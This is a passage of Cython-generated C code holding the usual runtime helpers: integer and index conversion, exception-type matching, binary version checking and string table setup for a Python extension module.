        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[4], rtversion[4];
    PyOS_snprintf(ctversion, 4, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    PyOS_snprintf(rtversion, 4, "%s", Py_GetVersion());
    if (ctversion[0] != rtversion[0] || ctversion[2] != rtversion[2]) {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */
